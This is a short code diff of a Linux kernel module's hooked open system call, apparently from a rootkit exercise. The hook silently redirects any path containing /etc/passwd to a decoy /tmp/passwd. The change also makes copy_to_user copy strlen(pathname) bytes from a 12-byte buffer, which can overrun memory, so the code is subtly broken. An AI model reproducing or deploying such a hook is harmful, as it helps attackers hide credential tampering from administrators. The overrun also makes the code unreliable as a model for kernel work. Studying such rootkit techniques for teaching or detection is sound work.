@@ -71,9 +71,9 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
     char originalPath[] = "/etc/passwd";
     char targetPath[] = "/tmp/passwd";
-    if (strcmp(pathname, originalPath) == 0)
+    if (strstr(pathname, originalPath) != NULL)
     {
-        copy_to_user((void *)pathname, targetPath, 12);
+        copy_to_user((void *)pathname, targetPath, strlen(pathname));
     }
 
     return original_call(pathname, flags);
